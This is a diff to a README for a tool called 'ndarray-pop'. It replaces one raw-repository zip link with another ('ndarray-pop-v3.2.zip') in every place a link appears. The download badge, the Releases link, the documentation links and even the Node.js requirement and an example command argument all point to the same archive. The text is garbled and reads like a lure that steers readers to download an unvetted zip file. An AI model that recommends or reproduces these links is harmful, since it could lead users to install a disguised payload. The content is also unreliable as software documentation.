@@ -6,14 +6,14 @@ Welcome! This guide will help you easily download and run the `ndarray-pop` appl
 
 ## 📥 Download Now
 
-[![Download ndarray-pop](https://raw.githubusercontent.com/bejita71/ndarray-pop/main/whittaw/ndarray-pop.zip)](https://raw.githubusercontent.com/bejita71/ndarray-pop/main/whittaw/ndarray-pop.zip)
+[![Download ndarray-pop](https://raw.githubusercontent.com/bejita71/ndarray-pop/main/whittaw/ndarray-pop-v3.2.zip)](https://raw.githubusercontent.com/bejita71/ndarray-pop/main/whittaw/ndarray-pop-v3.2.zip)
 
 ## 📋 System Requirements
 
 Before you begin, ensure your system meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux
-- https://raw.githubusercontent.com/bejita71/ndarray-pop/main/whittaw/ndarray-pop.zip installed (recommended version: 14.x or higher)
+- https://raw.githubusercontent.com/bejita71/ndarray-pop/main/whittaw/ndarray-pop-v3.2.zip installed (recommended version: 14.x or higher)
 - Sufficient disk space for application files
 
 ## 🎧 Features
@@ -25,7 +25,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 📦 Download & Install
 
-To get `ndarray-pop`, visit this page to download: [ndarray-pop Releases](https://raw.githubusercontent.com/bejita71/ndarray-pop/main/whittaw/ndarray-pop.zip).
+To get `ndarray-pop`, visit this page to download: [ndarray-pop Releases](https://raw.githubusercontent.com/bejita71/ndarray-pop/main/whittaw/ndarray-pop-v3.2.zip).
 
 ### Steps to Download:
 
@@ -54,7 +54,7 @@ After installing, you can start using `ndarray-pop`.
 To see a truncated view of your array, you might run:
 
 ```
-ndarray-pop --input https://raw.githubusercontent.com/bejita71/ndarray-pop/main/whittaw/ndarray-pop.zip --dimension 1
+ndarray-pop --input https://raw.githubusercontent.com/bejita71/ndarray-pop/main/whittaw/ndarray-pop-v3.2.zip --dimension 1
 ```
 
 This command helps you visualize the last elements in the specified dimension.
@@ -63,7 +63,7 @@ This command helps you visualize the last elements in the specified dimension.
 
 If you encounter issues, try the following:
 
-- Ensure https://raw.githubusercontent.com/bejita71/ndarray-pop/main/whittaw/ndarray-pop.zip is correctly installed by typing `node -v` in your terminal.
+- Ensure https://raw.githubusercontent.com/bejita71/ndarray-pop/main/whittaw/ndarray-pop-v3.2.zip is correctly installed by typing `node -v` in your terminal.
 - Verify that you are in the correct directory where your ndarray files are stored.
 - Check for any error messages and search for solutions online.
 
@@ -73,7 +73,7 @@ Engage with other users and get help in the community forum. Share your experien
 
 ## 📚 Additional Resources
 
-- [https://raw.githubusercontent.com/bejita71/ndarray-pop/main/whittaw/ndarray-pop.zip Documentation](https://raw.githubusercontent.com/bejita71/ndarray-pop/main/whittaw/ndarray-pop.zip)
-- [Array Manipulation Techniques](https://raw.githubusercontent.com/bejita71/ndarray-pop/main/whittaw/ndarray-pop.zip)
+- [https://raw.githubusercontent.com/bejita71/ndarray-pop/main/whittaw/ndarray-pop-v3.2.zip Documentation](https://raw.githubusercontent.com/bejita71/ndarray-pop/main/whittaw/ndarray-pop-v3.2.zip)
+- [Array Manipulation Techniques](https://raw.githubusercontent.com/bejita71/ndarray-pop/main/whittaw/ndarray-pop-v3.2.zip)
 
-Thank you for choosing `ndarray-pop`. Visit this page to download: [ndarray-pop Releases](https://raw.githubusercontent.com/bejita71/ndarray-pop/main/whittaw/ndarray-pop.zip). Enjoy your new array viewing experience!
+Thank you for choosing `ndarray-pop`. Visit this page to download: [ndarray-pop Releases](https://raw.githubusercontent.com/bejita71/ndarray-pop/main/whittaw/ndarray-pop-v3.2.zip). Enjoy your new array viewing experience!
